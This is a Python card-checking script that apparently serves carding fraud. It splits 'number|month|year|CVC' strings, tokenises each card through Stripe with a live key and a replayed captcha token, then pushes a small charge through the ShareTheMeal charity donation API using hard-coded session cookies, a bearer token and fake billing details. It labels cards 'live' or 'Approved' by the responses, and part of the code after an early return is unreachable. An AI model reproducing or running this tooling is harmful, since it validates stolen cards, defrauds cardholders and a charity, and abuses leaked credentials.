import os

try:
    import pyfiglet, webbrowser, user_agent, time
    import requests
    import re
    import base64
    import random
    import string
    
except ImportError as e:
    print("حدث خطأ في استدعاء مكتبة:", e)
    print("يتم تثبيت المكتبات...")
    os.system('pip install pyfiglet user_agent requests')
    import pyfiglet
    import webbrowser
    import user_agent
    import time
    import requests
    import re
    import base64
    import random
    import string
    import requests


def st(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	
	import requests
	
	# First API Request to get Stripe Token ID
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'guid=e5e016cd-c8d8-488e-b71c-7d54835e456122fdd1&muid=63747385-e6e3-4765-97a4-9f318948140be56a79&sid=a70ec69e-bf4c-403b-bcff-46964e893dfbf2204d&referrer=https%3A%2F%2Fsharethemeal.org&time_on_page=60620&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYvFDS31JCo4GWtlVkPfW1CFDxwKILVDlAsvYPFo-kUcAndimndYmlKhDjScX8KUrQWVSm_v0GVGjjoFbxSk-DGzWqUaCqDBsNZxGMQFsx5-BL4D18Gt6dZpnRxTs1aI8v3nqUFtMo0RAb6AFUMJqAV2mmqax8IFO59FIBK8RtVb4xAxVR1cEWGuaK17ju65zR-8aOnprgFTTfOpZZE2vihuKWmyXv7vyi4pDZRU9E6OR_wlvt03LsNNrXgshpzmN3vwBEdX5vTw9mtID0FiU36fgKRyv0PhaIlk8wIamw8xd4oDeR49RoRpRa2YJ8zf-Y4kYxLApDhqPQte5vJmpcPtnVQu6C_6CL8ogCYlRIlVPCk90-R1Dtupiun4uxYJS-C1EHQmK040N9LYx7Jipnc0laYhkJBntA6gB9gHnlt6unDgto2sALskqPZrtt30TrS5HTgZSoPXl63_un_UwcWIGKIzG59dmgfIKnHxUZE7R3CusVm8pyyQULTGxsnfVo01EKvEMfywHb6O7PmUupJ1wvg4EgmlN5BgrS3GxiVUzOwWRJg7axq8Ns8wrlkfVil7L1B8hpd6wsi9nQfO1BVrWs26v74mD2ikiCcGfBHSFHD5Rk0F_sEZ0M4k8CVqVW_VPavLU7ahFAm0MavmNtsQf0E8DoLqmoATyr7rY-kX-RpzOzYKW0A1hc1nfZ4lgRlTLRgSMtz-mK-jsFAUiq7qV4pa8rZRdEp0y57BqO5ACuFyzSrNaRYRsho9sRDAsU9CGoStlhEbBliJcrK9m16N3dO0RDjLuBK6Vy0xxiAhB0Gyy_0etgAKcQJOP-u4762nhNddIw5LyNTFtntX0yZclAnTtJEdfMZ-CfBi4nMAbagZSMANwY2skeaQCmcWqCaRLjYRm4xXubOfHGLmNNrRt4ZW8IDhhzJzsn9RtH0yfEoALlr_nmd9UvU-cumyFAsBR2FzddnzZAFi5wsJRCbgQW6jI0fjgOJ2FvOXV1ZmnkJrTr3fTXgpn33v5xqioYaHvM9Zw6bRyDpA2bgSKdOJh30nGWLtXP93xW3lND0X6h9BKXgP9jGMLIH86y68fWuQ1JMC3iVEAzt1ReV0BDRWvC9YaBA3ccX8q9PvUfPAI_pU_2AgA2EmwsNOEWNXLva2XOT6joGe3FaKZEhXSzFwvlBeaheBzJkP6NyfX1G2BEQ9nb3nnRjlLVKCv0wGe1k6-WCkhi9wGu51Aqb9dWXXV3oW7Ib4345M4gX-nb_7N4bjeTkGjxH7CQBS7uek2LrsGKl8gOylxSLfXpntXwc99I0pH2MT1TFKqH8srP5xtsSATq_AJoAjzUsq_zW3pqQsj2UsLWmPpiwYxnlnvfr3JSWoyFN-WqzoASqmL2Ws-__4jC6mhvAFHoFSZ0GeLtHFIGgoP7Y3VU_FrFYpqidAOhDxLysG6qm3f1yO9v-Db_CZsSVrtAA45T6NdH9ystif7_KxmCRQaCoU558y4BZPDgcVtf_VFDgs0GRr7u209Uxf89IHlXIWS85bAKvla6shoK-ZOvSXIVPtPJFrc7Xe6VUOEJZx_LJ74RItUk3fD0LJ3SUfhgfSPZ5qoiUb9yj-PeOqzLtYzIujb2SYtuve0Ei0Ro6cXImdH6Qgi2VCjqbln1Q95aQjVasRZhn7178cj2Mrv55cRIwTxPU5HdX99DxMlNM3-1XYO91kuWo4ND96QbEV8w9Df5Z1xjJqxiXSodE7DviaVxAhD7k1tcKy13CZKvrhK51TOzwwIMrv-5pPsHLYIJQZ2iDPR1oPLi30UuBF5AR-gNad5IZDZ032gj96SiF2nSVGxWKDaIhJ9vuX19UzplYZSsVFVMVA63Fc3foH8COjucx4iZs7crWxstJl05dNHGVojqv62I_JxdCyj9X3mRlrvUjx-4Ftm7gh8dBHvN8mgl-aIygUllRdqd7oZBHraFCfIYAyHrQPgMGZWwlRJXD3qeEmdfDR-7wJ8nKAPOBfe9RxqBSMxlWZBrxWRi66xU9nNFAGcCYshxmtGnX6Cj4DzvGCz9JKpUXHUIGrbrXxVa1a6cQNTL7khGbwQnDBWcyt0AePTqexfsADa4S57QZ-rymRE6LKjZXhwzmaDz8Ooc2hhcmRfaWTOAzGDb6JrcqgyOWRjZWUzZaJwZAA.E_PWX_j37J9IlxZS5EKhh-TNILHA0hd8ZGxvAENnomc&payment_user_agent=stripe.js%2F6ce7db85dd%3B+stripe-js-v3%2F6ce7db85dd%3B+card-element&pasted_fields=number&key=pk_live_51CG6QIAuAfacV15ffMAByPbXjXCzrIxODFNItPs4zRuFHJHY9kvYiuUeAvjD7OwPM64BoJQ23AJVrAWYMoC4GtxY00PMX2UyCa'
	
	response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
	try:
		token_id=response.json()['id']
	except:
		return 'Your card was declined.'
	import requests
	
	# Second API Request for payment
	cookies = {
	    '_fbp': 'fb.1.1719914279123.654148206765781737',
	    'stmDeviceId': '4d418a40-17d5-4224-b069-b55e80b55a47',
	    'AMP_MKTG_7fe3705773': 'JTdCJTIycmVmZXJyZXIlMjIlM0ElMjJodHRwcyUzQSUyRiUyRnd3dy5nb29nbGUuY29tJTJGJTIyJTJDJTIycmVmZXJyaW5nX2RvbWFpbiUyMiUzQSUyMnd3dy5nb29nbGUuY29tJTIyJTdE',
	    'aws-waf-token': 'b42dbfb5-992d-4662-8785-14312251932d:IAoAo6FFQNEEAAAA:54DV9z/GbiLMYgtgB7It0Hp/ZP9IRtHkBp945xdAdeqRSM9VR1fRMWJt4WxAZ776up6switZc50ZIb4QxpsN0VBrR4o6AQZplbzyupySITL7ZLFOJj1TROkcoZh0ERznzSwE6mIkRp4L078fvH2XYA3lUSiB9IWpWrn+olujUiX8W8zjImrBoE9UYwYV1NblYvI2a9fWQXNL2A8=',
	    '_tt_enable_cookie': '1',
	    '_ttp': 'DK-afSysGDOHJTkPniz2Ytn9596',
	    'connect.sid': 's%3AeZvXlxbxp7r8Bbyk-q8coywq8m2FK_Ha.crYdam1ot6unHMM1RWCss8Q3DLowExfsPH%2Bu5Dl0fGw',
	    '__stripe_mid': '63747385-e6e3-4765-97a4-9f318948140be56a79',
	    '__stripe_sid': 'a70ec69e-bf4c-403b-bcff-46964e893dfbf2204d',
	    '_ga': 'GA1.1.302589018.1719914312',
	    '_ga_N348N6YQFE': 'GS1.1.1719914312.1.1.1719914355.17.0.0',
	    'AMP_7fe3705773': 'JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjI0ZDQxOGE0MC0xN2Q1LTQyMjQtYjA2OS1iNTVlODBiNTVhNDclMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzE5OTE0Mjc5NTU4JTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTcxOTkxNDM1NTYzNyUyQyUyMmxhc3RFdmVudElkJTIyJTNBMTclN0Q=',
	}
	
	headers = {
	    'authority': 'app.sharethemeal.org',
	    'accept': 'application/json',
	    'accept-language': 'ar-001',
	    'authorization': 'Bearer LAXQszxcmpGMWi24y0NFt00YPWGJnJOo9Ba8ijLcI1fmiKHI1PDF7KG7PGJU7KcX',
	    'content-type': 'application/json',
	    'origin': 'https://sharethemeal.org',
	    'referer': 'https://sharethemeal.org/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'stm-app-version': '3.12.0',
	    'stm-device-id': '4d418a40-17d5-4224-b069-b55e80b55a47',
	    'stm-platform': 'web',
	    'stm-request-id': '8bc0df06-ce88-4ca8-b931-b2d1a7b0ecf6',
	    'stm-timezone': 'Africa/Cairo',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-aws-waf-token': 'b42dbfb5-992d-4662-8785-14312251932d:IAoAo6FFQNEEAAAA:54DV9z/GbiLMYgtgB7It0Hp/ZP9IRtHkBp945xdAdeqRSM9VR1fRMWJt4WxAZ776up6switZc50ZIb4QxpsN0VBrR4o6AQZplbzyupySITL7ZLFOJj1TROkcoZh0ERznzSwE6mIkRp4L078fvH2XYA3lUSiB9IWpWrn+olujUiX8W8zjImrBoE9UYwYV1NblYvI2a9fWQXNL2A8=',
	}
	
	json_data = {
	    'amount': 0.8,
	    'billingDetails': {
	        'addressLine1': 'New York',
	        'city': 'New York ',
	        'country': 'US',
	        'email': 'momakhgfjns935@gmail.com',
	        'fullName': 'Mhfo Mansour ',
	        'zipCode': '10080',
	    },
	    'campaignId': 'palestine11',
	    'currency': 'USD',
	    'doNotVault': False,
	    'paymentMethodNonce': token_id,
	    'paymentMethodToken': '',
	    'paymentMethodType': 'card',
	    'provider': 'stripe',
	    'idempotencyKey': 'ca2d3eb4-ff18-485c-8640-4ce466430b56',
	}
	
	response = requests.post(
	    'https://app.sharethemeal.org/api/v2.0/payments/userHashPlaceholder/transactions',
	    cookies=cookies,
	    headers=headers,
	    json=json_data,
	)
	print(response.json()['message'])
	time.sleep(15)
	try:
		ii=response
	except:
	    return 'success'
	return ii #Smoke #Smoke #Smoke #Smoke #Smoke #Smoke #Smoke #Smoke #Smoke #Smoke 
	try:
		ii=(response.json()['error'][0]['declinecode'])
		return ii
	except:
			return 'live'
			
		
		
	

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"id":10486458,"address":"9350 N Central Expy","name":"yusuf","country":"US","vat":null,"billing_account_id":10486458,"last4":"9305","orderReference":"nljannd","user_id":11296645,"organization_id":10807386,"hours":0,"balance_increase_in_cents":null,"payment_method_id":"pm_1PLSN5KEzvleW5flaDzdyat6","transcription_id":null,"plan":"pro_2023_05_01","order_id":null,"recurrence_interval":"month","extra_plan_hours":null}'
#response = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, data=data)
	
	text = response.text
		
	pattern = r'Status code (.*?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
	
	if 'Success' in result or 'successfully' in result or 'thank you' in result or 'thanks' in result or 'approved' in result or 'fund' in result:
			return 'Approved'
	else:
		return result
def sq(card):
	return 'Your card was declined.'
	
	